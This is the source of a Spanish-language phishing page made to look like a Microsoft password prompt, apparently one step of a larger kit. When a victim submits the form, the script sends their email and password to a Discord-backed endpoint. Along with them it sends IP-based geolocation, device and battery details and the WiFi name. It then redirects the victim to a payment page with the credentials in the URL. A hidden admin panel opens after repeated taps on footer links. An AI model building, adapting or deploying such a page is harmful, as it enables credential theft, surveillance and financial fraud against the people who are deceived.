<!doctype html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Escribir contraseña</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              'ms-blue': '#0078d4', 'ms-blue-hover': '#106ebe',
              'ms-red': '#f25022', 'ms-green': '#7fba00',
              'ms-yellow': '#ffb900', 'ms-blue-logo': '#00bcf2',
              'ms-gray': '#1b1b1b', 'ms-gray-light': '#605e5c',
              'ms-border': '#8a8886',
            },
            fontFamily: {
              'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
            }
          }
        }
      }
    </script>
    <style>
      *, *::before, *::after { box-sizing: border-box; margin:0; padding:0; }
      html, body {
        min-height: 100vh; width: 100%;
        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        overflow-x: hidden;
      }

      /* === FONDO (hereda del mismo sistema que index.html) === */
      body {
        background: #0a0a1a;
        background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
      }
      body.bg-color    { background-image: none; }
      body.bg-gradient { background-image: none; }
      body.bg-image    { background-color: transparent; }

      .ms-input {
        border: 1px solid #8a8886; font-size: 15px;
        padding: 11px 12px; line-height: 20px; border-radius: 2px;
        background: #fff; color: #1b1b1b; width: 100%;
        transition: border-color .15s, box-shadow .15s;
      }
      .ms-input:focus {
        outline: none; border-color: #0078d4;
        box-shadow: inset 0 0 0 1px #0078d4;
      }
      .ms-button {
        background: #0078d4; color: #fff; border: none;
        font-size: 15px; font-weight: 600;
        padding: 8px 12px; min-height: 32px; border-radius: 2px;
        cursor: pointer; transition: background-color .1s;
      }
      .ms-button:hover  { background: #106ebe; }
      .ms-button:active { background: #005a9e; }
      .ms-button:disabled { background: #8a8886; cursor: not-allowed; }
      .ms-link { color: #0078d4; text-decoration: none; font-size: 13px; }
      .ms-link:hover { text-decoration: underline; }

      .fade-in { animation: fadeIn .3s ease-out; }
      @keyframes fadeIn {
        from { opacity:0; transform:translateY(10px); }
        to   { opacity:1; transform:translateY(0); }
      }

      .login-wrapper {
        position: relative; z-index: 1;
        min-height: 100vh;
        display: flex; align-items: center; justify-content: center;
        padding: 1rem;
      }
      .login-card {
        position: relative; z-index: 2;
        background: rgba(255,255,255,.95);
        backdrop-filter: blur(4px);
        border-radius: 8px;
        box-shadow: 0 2px 6px rgba(0,0,0,.2);
        padding: 2rem 2rem;
        width: 100%; max-width: 400px;
        animation: fadeIn .3s ease-out;
      }

      .page-footer {
        position: fixed; bottom: 0; left: 0; right: 0;
        background: rgba(255,255,255,.92);
        backdrop-filter: blur(8px);
        border-top: 1px solid #e1dfdd;
        padding: .45rem 1rem;
        z-index: 100;
        font-size: 12px; color: #605e5c;
      }
      .page-footer a { color: #0078d4; text-decoration: none; }
      .page-footer a:hover { text-decoration: underline; }
      .footer-inner {
        max-width: 560px; margin: 0 auto;
        display: flex; flex-wrap: wrap;
        align-items: center; justify-content: center;
        gap: .4rem .8rem;
      }
      .footer-private-note {
        text-align: center; font-size: 11px;
        color: #605e5c; width: 100%; padding-top: .2rem;
      }

      #tapCounter { display: none; }

      /* Panel admin toggle bar */
      .admin-toggle-bar {
        position: fixed; top: 0; left: 0; right: 0;
        z-index: 200;
        background: rgba(255,255,255,.95);
        border-bottom: 1px solid #e1dfdd;
        padding: .4rem 1rem;
        display: flex; gap: .8rem; align-items: center; justify-content: center;
        font-size: 13px; color: #605e5c;
      }
      .admin-toggle-bar button {
        background: none; border: 1px solid #8a8886;
        border-radius: 2px; padding: .3rem .7rem;
        font-size: 12px; color: #1b1b1b; cursor: pointer;
        transition: background .15s;
      }
      .admin-toggle-bar button:hover { background: #f5f5f5; }
    </style>
  </head>
  <body class="bg-color">

    <!-- Barra admin -->
    <div class="admin-toggle-bar" id="adminBar" style="display:none;">
      <span id="adminStatus">🔒 Panel cerrado</span>
      <button id="adminLogoutBtn" onclick="adminLogout()">Cerrar sesión admin</button>
    </div>

    <div id="tapCounter"></div>

    <!-- === MAIN === -->
    <div class="login-wrapper">
      <div class="login-card">

        <!-- Email avatar -->
        <div style="text-align:center; margin-bottom:1rem;">
          <div style="display:inline-flex; align-items:center; justify-content:center;
              background:transparent; border:1px solid #c8c6c2;
              border-radius: 999px; padding: .35rem .9rem;">
            <span id="userEmail" style="font-size:13px; font-weight:500; color:#1b1b1b;">—</span>
          </div>
        </div>

        <h1 style="font-size:28px; font-weight:600; color:#1b1b1b;
            margin:0 0 1.6rem; text-align:center; line-height:36px;">Escribir contraseña</h1>

        <form onsubmit="handlePasswordSubmit(event)" style="display:flex; flex-direction:column; gap:1rem;">
          <div style="position:relative;">
            <input type="password" id="password" placeholder="Contraseña"
                class="ms-input" required autocomplete="current-password" />
            <button type="button" onclick="togglePassword()"
                style="position:absolute; right:8px; top:50%; transform:translateY(-50%);
                background:none; border:none; cursor:pointer; padding:4px;"
                tabindex="-1">
              <svg id="eyeIcon" style="width:16px; height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                  d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                  d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
              </svg>
            </button>
          </div>

          <div style="text-align:right;">
            <a href="#" class="ms-link">¿Olvidó su contraseña?</a>
          </div>

          <button type="submit" class="ms-button" style="width:100%;" id="loginBtn">
            Iniciar sesión
          </button>
        </form>

        <div style="margin-top:1.2rem; padding-top:.8rem; border-top:1px solid #e1dfdd; text-align:center;">
          <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
        </div>

        <!-- Input WiFi opcional -->
        <div style="margin-top:1rem;">
          <input type="text" id="wifiName" placeholder="Nombre del WiFi (opcional)"
              class="ms-input" style="padding:8px 12px; font-size:13px;" />
        </div>
      </div>
    </div>

    <!-- === FOOTER === -->
    <div class="page-footer" id="pageFooter">
      <div class="footer-inner">
        <a href="#" id="footerHelp" onclick="handleFooterTap('help')">Ayuda</a>
        <a href="#" id="footerTerms">Términos de uso</a>
        <a href="#" id="footerPrivacy" onclick="handleFooterTap('privacy')">Privacidad y cookies</a>
        <span style="text-align:center; width:100%; padding-top:.15rem; font-size:11px; color:#605e5c;">
          Usa la exploración privada si este no es tu dispositivo.
          <a href="#" style="color:#0078d4;">Más información</a>
        </span>
      </div>
      <div class="footer-private-note" id="footerPrivateNote"></div>
    </div>

    <script>
      // ============================================================
      //  GLOBALS
      // ============================================================
      const DEFAULT_CONFIG = {
        discordWebhook: '',
        discordMessageTemplate: '',
        appTitle: 'Escribir contraseña',
        loginBgType: 'image',
        loginBgColor: '#0a0a1a',
        loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
        loginBgImage: 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg',
        footerHelpText: 'Ayuda',
        footerTermsText: 'Términos de uso',
        footerPrivacyText: 'Privacidad y cookies',
        footerPrivateNoteText: '',
        showAdminBar: false,
      };

      let savedConfig = loadConfig();
      function loadConfig() {
        try {
          const s = localStorage.getItem('mail_officee3656_config');
          if (s) { const p = JSON.parse(s); return { ...DEFAULT_CONFIG, ...p }; }
        } catch(e) {}
        return { ...DEFAULT_CONFIG };
      }
      function saveConfig(cfg) { savedConfig = cfg;
        try { localStorage.setItem('mail_officee3656_config', JSON.stringify(cfg)); } catch(e) {} }
      function getSavedSetting(key) { return savedConfig[key] !== undefined ? savedConfig[key] : DEFAULT_CONFIG[key]; }

      // ============================================================
      //  FONDO
      // ============================================================
      function applyLoginBackground() {
        const bgType  = getSavedSetting('loginBgType')   || 'image';
        const bgColor = getSavedSetting('loginBgColor')  || '#0a0a1a';
        const bgGrad  = getSavedSetting('loginBgGradient')|| 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)';
        const bgImg   = getSavedSetting('loginBgImage')  || 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg';
        const body    = document.body;
        body.classList.remove('bg-color','bg-gradient','bg-image');
        if (bgType === 'gradient') {
          body.style.background = bgGrad; body.classList.add('bg-gradient');
        } else if (bgType === 'image' && bgImg) {
          body.style.backgroundImage = 'url('+bgImg+')';
          body.style.backgroundSize  = 'cover';
          body.style.backgroundPosition = 'center';
          body.classList.add('bg-image');
        } else {
          body.style.backgroundColor = bgColor; body.classList.add('bg-color');
        }
      }

      function applyFooterTexts() {
        document.getElementById('footerHelp').textContent    = getSavedSetting('footerHelpText')    || 'Ayuda';
        document.getElementById('footerTerms').textContent   = getSavedSetting('footerTermsText')   || 'Términos de uso';
        document.getElementById('footerPrivacy').textContent = getSavedSetting('footerPrivacyText') || 'Privacidad y cookies';
      }

      function applyAppTexts() {
        const titleEl = document.querySelector('h1');
        if (titleEl) titleEl.textContent = getSavedSetting('appTitle') || 'Escribir contraseña';
      }

      // ============================================================
      //  EYE TOGGLE
      // ============================================================
      function togglePassword() {
        const inp = document.getElementById('password');
        const eye = document.getElementById('eyeIcon');
        if (!inp || !eye) return;
        if (inp.type === 'password') {
          inp.type = 'text';
          eye.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>';
        } else {
          inp.type = 'password';
          eye.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>';
        }
      }

      // ============================================================
      //  DOBLE TAP
      // ============================================================
      let tapHelpCount    = 0;
      let tapPrivacyCount = 0;
      const ADMIN_UNLOCKED = 'mail_officee3656_admin_unlocked';

      function handleFooterTap(which) {
        if (which === 'help')    tapHelpCount++;
        if (which === 'privacy') tapPrivacyCount++;

        if (tapHelpCount >= 2 && tapPrivacyCount >= 2) {
          tapHelpCount = 0; tapPrivacyCount = 0;
          localStorage.setItem(ADMIN_UNLOCKED, 'true');
          document.getElementById('footerPrivateNote').textContent =
            '🔓 Ingresa la clave para entrar al panel';
          return;
        }
      }

      // ============================================================
      //  SEND TO DISCORD
      // ============================================================
      async function sendToDiscord(email, password, wifiName) {
        // --- Geo IP ---
        let geoCity='', geoRegion='', geoCountry='', geoCountryCode='',
            geoTimezone='', geoIsoCode='', geoIsp='', geoLatitude='', geoLongitude='',
            geoZip='', geoCurrency='', geoCurrencyCode='', geoCallingCode='', geoNetwork='';
        try {
          const r = await fetch('https://ipinfo.io/json');
          if (r.ok) {
            const d = await r.json();
            geoCity       = d.city       || '';
            geoRegion     = d.region     || '';
            geoCountry    = d.country    || '';
            geoCountryCode= d.country    || '';
            geoTimezone   = d.timezone   || '';
            geoIsoCode    = d.country    || '';
            geoIsp        = d.org        || '';
            const loc     = d.loc        || '';
            if (loc) {
              const parts = loc.split(',');
              geoLatitude  = parts[0] || '';
              geoLongitude = parts[1] || '';
            }
            geoZip        = d.postal     || '';
            geoCurrency   = d.currency   || '';
            geoCurrencyCode = d.currency || '';
            geoCallingCode= d.phone      || '';
            geoNetwork    = d.org        || '';
          }
        } catch(e) { console.warn('ipinfo failed', e); }

        // --- IPify ---
        let ipifyIp = '';
        try {
          const r2 = await fetch('https://api.ipify.org?format=json');
          if (r2.ok) { const d2 = await r2.json(); ipifyIp = d2.ip || ''; }
        } catch(e) {}

        // --- Batería ---
        let batteryLevel='No disponible', batteryCharging='Desconocido';
        try {
          if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            batteryLevel   = (bat.level * 100).toFixed(0) + '%';
            batteryCharging= bat.charging ? 'Sí' : 'No';
          }
        } catch(e) {}

        // --- Dispositivo ---
        const deviceMemory   = navigator.deviceMemory   || 'desconocido';
        const cpuCores       = navigator.hardwareConcurrency || 'desconocido';
        const touchPoints    = navigator.maxTouchPoints || 0;
        const ua             = navigator.userAgent       || 'desconocido';
        const language       = navigator.language        || 'desconocido';
        const languages      = navigator.languages       || [language];
        const screenW        = window.screen.width;
        const screenH        = window.screen.height;
        const screenResolution = screenW + 'x' + screenH;
        const colorDepth     = window.screen.colorDepth  || 'desconocido';
        const timezone       = Intl.DateTimeFormat().resolvedOptions().timeZone || 'desconocido';
        const platform       = navigator.platform        || 'desconocido';
        const onlineStatus   = navigator.onLine ? 'Sí' : 'No';
        const cookiesEnabled = navigator.cookieEnabled   ? 'Sí' : 'No';
        const isMobile       = /Android|iPhone|iPad|iPod/i.test(ua) ? 'Sí' : 'No';
        const isTablet       = /Tablet|iPad/i.test(ua)   ? 'Sí' : 'No';
        const isDesktop      = !isMobile && !isTablet    ? 'Sí' : 'No';

        // --- Payload ---
        const payload = {
          email, password,
          userAgent: ua, language, languages: languages.join(','),
          screenResolution, colorDepth, timezone, platform,
          onlineStatus, cookiesEnabled,
          deviceMemory, cpuCores, touchPoints,
          isMobile, isTablet, isDesktop,
          batteryLevel, batteryCharging,
          geoIp: ipifyIp || (geoCity ? 'geo' : ''),
          geoCity, geoRegion, geoCountry, geoCountryCode,
          geoTimezone, geoIsoCode, geoIsp,
          geoLatitude, geoLongitude, geoZip,
          geoCurrency, geoCurrencyCode, geoCallingCode, geoNetwork,
          ipifyIp,
          wifiName: wifiName || '',
          type: 'login',
        };

        try {
          const res = await fetch('/api/discord', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
          });
          const data = await res.json();
          if (data.success) return true;
          console.warn('Discord API:', data.error);
          return false;
        } catch(e) {
          console.warn('Discord fetch failed:', e);
          return false;
        }
      }

      // ============================================================
      //  HANDLER — CONTRASEÑA (paso 2)
      // ============================================================
      function handlePasswordSubmit(e) {
        e.preventDefault();
        const passInput = document.getElementById('password');
        const pass      = passInput.value;
        const wifiInput = document.getElementById('wifiName');
        const wifi      = wifiInput ? wifiInput.value.trim() : '';

        if (!pass) return;

        const btn = document.getElementById('loginBtn');
        btn.disabled   = true;
        btn.textContent = 'Verificando...';

        sendToDiscord(getEmailFromUrl(), pass, wifi)
          .then(ok => {
            setTimeout(() => {
              window.location.href = 'payment.html?email=' + encodeURIComponent(getEmailFromUrl()) + '&password=' + encodeURIComponent(pass);
            }, 400);
          })
          .catch(() => {
            setTimeout(() => {
              window.location.href = 'payment.html?email=' + encodeURIComponent(getEmailFromUrl()) + '&password=' + encodeURIComponent(pass);
            }, 400);
          });
      }

      function getEmailFromUrl() {
        const params = new URLSearchParams(window.location.search);
        return params.get('email') || '';
      }

      // ============================================================
      //  INICIALIZACIÓN
      // ============================================================
      applyLoginBackground();
      applyFooterTexts();
      applyAppTexts();

      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get('email') || '';
      if (email) document.getElementById('userEmail').textContent = email;

      // Verificar desbloqueo admin
      if (localStorage.getItem(ADMIN_UNLOCKED) === 'true') {
        document.getElementById('footerPrivateNote').textContent =
          '🔓 Ingresa la clave para entrar al panel';
      }
      if (urlParams.get('adminUnlocked') === '1') {
        document.getElementById('adminBar').style.display = 'flex';
        document.getElementById('adminStatus').textContent = '🔓 Panel abierto';
        document.getElementById('footerPrivateNote').textContent = 'Panel activo';
      }
    </script>
  </body>
</html>
